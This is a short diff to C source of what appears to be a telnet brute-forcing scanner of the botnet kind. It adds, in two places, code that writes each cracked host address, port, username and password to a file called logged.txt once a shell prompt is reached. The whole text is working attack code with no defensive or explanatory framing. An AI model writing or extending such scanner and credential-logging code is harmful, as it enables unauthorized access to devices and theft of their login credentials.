@@ -311,6 +311,11 @@ void brute_handle_data(int fd) {
             }
         } else if (has_shell_prompt(bc)) {
             ATOMIC_INC(&g_brute_logged);
+            FILE *fp = fopen("logged.txt", "a");
+            if (fp) {
+                fprintf(fp, "%s:%d %s:%s\n", bc->address, bc->port, c->username, c->password);
+                fclose(fp);
+            }
             sockprintf(fd, "enable\r\n");
             bc->rdbuf_pos = 0;
             memset(bc->rdbuf, 0, RDBUF_SIZE);
@@ -328,6 +333,11 @@ void brute_handle_data(int fd) {
             }
         } else if (has_shell_prompt(bc)) {
             ATOMIC_INC(&g_brute_logged);
+            FILE *fp = fopen("logged.txt", "a");
+            if (fp) {
+                fprintf(fp, "%s:%d %s:%s\n", bc->address, bc->port, c->username, c->password);
+                fclose(fp);
+            }
             sockprintf(fd, "enable\r\n");
             bc->rdbuf_pos = 0;
             memset(bc->rdbuf, 0, RDBUF_SIZE);
